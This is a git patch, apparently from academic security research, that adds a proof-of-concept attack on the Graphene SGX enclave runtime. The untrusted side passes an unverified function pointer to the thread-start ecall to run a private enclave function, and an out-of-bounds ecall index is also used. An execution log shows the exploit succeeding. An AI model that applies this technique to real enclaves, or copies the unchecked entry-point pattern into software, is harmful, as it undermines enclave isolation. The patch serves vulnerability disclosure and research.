@@ -1,0 +1,173 @@
+From 37176a44bcae253a4a84a07768148195e8a2e041 Mon Sep 17 00:00:00 2001
+From: Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>
+Date: Tue, 20 Dec 2016 18:17:27 +0100
+Subject: [PATCH 3/3] PoC code abuse attack through unverified function pointer
+ in enclave_ecall_thread_start.
+
+---
+ .../hello/logs/exploit_thread_start_fct_ptr.txt    | 54 ++++++++++++++++++++++
+ Pal/src/host/Linux-SGX/enclave_ecalls.c            | 14 ++++++
+ Pal/src/host/Linux-SGX/sgx_enclave.c               | 20 ++++++--
+ 3 files changed, 84 insertions(+), 4 deletions(-)
+ create mode 100644 LibOS/shim/test/apps/hello/logs/exploit_thread_start_fct_ptr.txt
+
+diff --git a/LibOS/shim/test/apps/hello/logs/exploit_thread_start_fct_ptr.txt b/LibOS/shim/test/apps/hello/logs/exploit_thread_start_fct_ptr.txt
+new file mode 100644
+index 0000000..7c5cdbc
+--- /dev/null
++++ b/LibOS/shim/test/apps/hello/logs/exploit_thread_start_fct_ptr.txt
+@@ -0,0 +1,54 @@
+++ exec /home/jo/graphene-clone/Pal/src/pal helloworld
++manifest file: file:helloworld.manifest.sgx
++enclave created:
++    base:         0x0000000000000000
++    size:         0x10000000
++    attr:         0x0000000000000007
++    xfrm:         0x0000000000000007
++    ssaframesize: 1
++    isvprodid:    0x00000000
++    isvsvn:       0x00000000
++User addr e3d0c000, addr ffff000 (0, ffff000), skip_eexten 0
++adding page  to enclave: 000000000ffff000 [REG:R--] (manifest) measured
++User addr 0, addr fff6000 (0, fff6000), skip_eexten 1
++adding pages to enclave: 000000000fff6000-000000000fffe000 [REG:RW-] (ssa)
++User addr e3d09000, addr fff1000 (0, fff1000), skip_eexten 1
++adding pages to enclave: 000000000fff1000-000000000fff5000 [TCS:---] (tcs)
++User addr e3d09000, addr ffec000 (0, ffec000), skip_eexten 1
++adding pages to enclave: 000000000ffec000-000000000fff0000 [REG:RW-] (tls)
++User addr 0, addr ffdb000 (0, ffdb000), skip_eexten 1
++adding pages to enclave: 000000000ffdb000-000000000ffeb000 [REG:RW-] (stack)
++User addr 0, addr ffca000 (0, ffca000), skip_eexten 1
++adding pages to enclave: 000000000ffca000-000000000ffda000 [REG:RW-] (stack)
++User addr 0, addr ffb9000 (0, ffb9000), skip_eexten 1
++adding pages to enclave: 000000000ffb9000-000000000ffc9000 [REG:RW-] (stack)
++User addr 0, addr ffa8000 (0, ffa8000), skip_eexten 1
++adding pages to enclave: 000000000ffa8000-000000000ffb8000 [REG:RW-] (stack)
++User addr e3cc6000, addr bd77000 (0, bd77000), skip_eexten 0
++adding pages to enclave: 000000000bd77000-000000000bda5000 [REG:R-X] (code) measured
++User addr e3d0b000, addr bfa4000 (0, bfa4000), skip_eexten 0
++adding pages to enclave: 000000000bfa4000-000000000bfa6000 [REG:RW-] (data) measured
++User addr 0, addr bfa6000 (0, bfa6000), skip_eexten 1
++adding pages to enclave: 000000000bfa6000-000000000ffa7000 [REG:RW-] (bss)
++User addr e3d0c000, addr 400000 (0, 400000), skip_eexten 0
++adding page  to enclave: 0000000000400000 [REG:RWX] (code) measured
++User addr e3d0b000, addr 600000 (0, 600000), skip_eexten 0
++adding pages to enclave: 0000000000600000-0000000000602000 [REG:RW-] (data) measured
++User addr 0, addr 602000 (0, 602000), skip_eexten 1
++adding pages to enclave: 0000000000602000-000000000bd76000 [REG:RWX] (free)
++User addr 0, addr 10000 (0, 10000), skip_eexten 1
++adding pages to enclave: 0000000000010000-0000000000400000 [REG:RWX] (free)
++enclave initializing:
++    enclave id:   0x000000000ffff000
++    enclave hash: 13 f0 44 da 63 60 f1 fa 53 6a 20 92 16 ab 3e 6e 1b 42 3f e2 c8 89 82 85 f6 8f aa ce 72 82 e9 85
++enclave (software) key hash: 65d3b36c296305011f49a45743f2d1dc547e1136792f4a1d950bab7d0b434d0
++trusted: [1] 7d5f3f23c7bfad547bd647f28f582c73eb17d753d2132e289f944d09eb33eeeb file:helloworld
++trusted: [2] 27520b21d5a9b681deb947f51ff0eaa62bda661df6aac65e7d356b17a250bd8f file:../../../src/libsysdb.so
++trusted: [3] 8221248333d159a13e4fee71e622f805fe4ebcf33708ae84ce8d702312bd3b5e file:../../../../glibc-build/ld-linux-x86-64.so.2
++trusted: [4] 9ce5738cc5fba2c9ec4d9922b2008d99f62c5f7d644bcd8187c2ea13f0ba7157 file:../../../../glibc-build/libc.so.6
++[urts] starting enclave thread with func 0xbd95ff0
++passing thread_start
++
++[trts] enclave_private_func: should *not* see this; exiting..
++destroying enclave...
++Segmentation fault (core dumped)
+diff --git a/Pal/src/host/Linux-SGX/enclave_ecalls.c b/Pal/src/host/Linux-SGX/enclave_ecalls.c
+index fe1206b..b7345d3 100644
+--- a/Pal/src/host/Linux-SGX/enclave_ecalls.c
++++ b/Pal/src/host/Linux-SGX/enclave_ecalls.c
+@@ -54,6 +54,17 @@ int enclave_ecall_pal_main (void * pms)
+     return 0;
+ }
+ 
++/*
++ * PoC: this function represents sensitive intra-enclave code that should not
++ * be called directly from the untrusted runtime..
++ */
++void enclave_private_func(void * arg)
++{
++    char *str = "[trts] enclave_private_func: should *not* see this; exiting..\n";
++    ocall_print_string(str, strlen(str));
++    ocall_exit_process(-1);
++}
++
+ int enclave_ecall_thread_start (void * pms)
+ {
+     ms_ecall_thread_start_t * ms = SGX_CAST(ms_ecall_thread_start_t *, pms);
+@@ -63,7 +74,10 @@ int enclave_ecall_thread_start (void * pms)
+     if (ms->ms_child_tid)
+         *ms->ms_child_tid = ms->ms_tid;
+ 
++    //XXX the ms->ms_func is provided by the untrusted runtime, but should
++    // be verified to be a valid entry point to prevent code abuse attacks..
+     ms->ms_func(ms->ms_arg);
++    
+     ocall_exit();
+     return 0;
+ }
+diff --git a/Pal/src/host/Linux-SGX/sgx_enclave.c b/Pal/src/host/Linux-SGX/sgx_enclave.c
+index a48030d..6c52d2e 100644
+--- a/Pal/src/host/Linux-SGX/sgx_enclave.c
++++ b/Pal/src/host/Linux-SGX/sgx_enclave.c
+@@ -20,7 +20,7 @@
+ 
+ #define ODEBUG(code, ms) do {} while (0)
+ 
+-int ecall_illegal(void);
++void ecall_illegal(void);
+ 
+ static int sgx_ocall_exit(void * pms)
+ {
+@@ -736,14 +736,19 @@ int ecall_pal_main (const char ** arguments, const char ** environments)
+     return sgx_ecall(ECALL_PAL_MAIN, &ms);
+ }
+ 
++#define EXPLOIT_ECALL_IDX       1
++#define EXPLOIT_THREAD_START    0
++
+ //XXX retrieve addresses with `objdump libpal-enclave.so / helloworld`
+-#define ECALL_TABLE_ADRS        (0x22e2c0)
++#define ECALL_TABLE_ADRS        (0x22e340)
+ #define TARGET_ADRS             (0x601078)
++#define PRIVATE_FUNC_ADRS       (0x1eff0)
+ 
+ extern struct pal_sec * pal_sec;
+ 
+-int ecall_illegal (void)
++void ecall_illegal (void)
+ {
++#if EXPLOIT_ECALL_IDX
+     /* 
+      * Trusted enclave_entry.S code does not check whether provided entry
+      * index is within the bounds of the intra-enclave ecall_table. We can
+@@ -758,7 +763,8 @@ int ecall_illegal (void)
+     printf("\n[urts] entering enclave with illegal ecall idx %d (ecall_table_adrs=%p)\n",
+         enr, ecall_table_adrs);
+ 
+-    return sgx_ecall(enr, NULL);
++    sgx_ecall(enr, NULL);
++#endif
+ }
+ 
+ int ecall_thread_start (void (*func) (void *), void * arg,
+@@ -766,12 +772,18 @@ int ecall_thread_start (void (*func) (void *), void * arg,
+ {
+     ms_ecall_thread_start_t ms;
+ 
++#if EXPLOIT_THREAD_START
++    func = pal_sec->enclave_addr + PRIVATE_FUNC_ADRS;
++#endif
++
+     ms.ms_func = func;
+     ms.ms_arg = arg;
+     ms.ms_child_tid = child_tid;
+     ms.ms_tid = tid;
+ 
+     EDEBUG(ECALL_THREAD_START, &ms);
++    
++    printf("[urts] starting enclave thread with func %p\n", func);
+ 
+     return sgx_ecall(ECALL_THREAD_START, &ms);
+ }
+-- 
+2.7.4
+
